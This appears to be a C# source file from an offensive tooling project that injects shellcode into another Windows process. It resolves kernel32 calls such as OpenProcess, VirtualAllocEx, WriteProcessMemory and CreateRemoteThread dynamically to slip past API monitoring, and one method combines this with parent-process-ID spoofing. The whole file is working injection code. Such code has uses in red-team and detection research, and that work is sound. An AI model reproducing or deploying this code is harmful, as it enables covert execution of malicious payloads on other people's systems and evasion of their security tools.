using System;
using System.Runtime.InteropServices;
using static ProcessInjection.Native.Enums;
using static ProcessInjection.Native.Structs;
using ProcessInjection.Native;


namespace ProcessInjection.DInvoke
{
    public class CreateRemoteThread
    {
        #region DynamicInvoke
        public static void DynamicCodeInject(int pid, byte[] buf)
        {
            uint lpNumberOfBytesWritten = 0;
            uint lpThreadId = 0;

            var pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "CloseHandle");
            var closehandle = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.CloseHandle)) as DynamicInvoke.CloseHandle;

            try
            {
                pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "OpenProcess");
                var openProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.OpenProcess)) as DynamicInvoke.OpenProcess;
                Console.WriteLine($"[+] Obtaining the handle for the process id {pid}.");
                IntPtr pHandle = openProcess((uint)ProcessAccessRights.All, false, (uint)pid);

                pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
                var virtualAllocEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.VirtualAllocEx)) as DynamicInvoke.VirtualAllocEx;
                Console.WriteLine($"[+] Handle {pHandle} opened for the process id {pid}.");
                Console.WriteLine($"[+] Allocating memory to inject the shellcode.");
                IntPtr rMemAddress = virtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);

                pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
                var writeProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.WriteProcessMemory)) as DynamicInvoke.WriteProcessMemory;
                Console.WriteLine($"[+] Memory for injecting shellcode allocated at 0x{rMemAddress}.");
                Console.WriteLine($"[+] Writing the shellcode at the allocated memory location.");
                if (writeProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
                {
                    Console.WriteLine($"[+] Shellcode written in the process memory.");
                    Console.WriteLine($"[+] Creating remote thread to execute the shellcode.");
                    pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
                    var createRemoteThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.CreateRemoteThread)) as DynamicInvoke.CreateRemoteThread;
                    IntPtr hRemoteThread = createRemoteThread(pHandle, IntPtr.Zero, 0, rMemAddress, IntPtr.Zero, 0, ref lpThreadId);
                    Console.WriteLine($"[+] Sucessfully injected the shellcode into the memory of the process id {pid}.");
                    closehandle(hRemoteThread);
                }
                else
                {
                    Console.WriteLine($"[+] Failed to write the shellcode into the memory of the process id {pid}.");
                }
                closehandle(pHandle);


            }
            catch (Exception ex)
            {
                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
                Console.WriteLine(ex.Message);
            }
        }

        public static void PPIDDynCodeInject(string binary, byte[] shellcode, int parentpid)
        {
            PPIDSpoofing Parent = new PPIDSpoofing();
            PROCESS_INFORMATION pinf = Parent.ParentSpoofing(parentpid, binary);
            DynamicCodeInject(pinf.dwProcessId, shellcode);
        }

        #endregion DynamicInvoke

    }
}
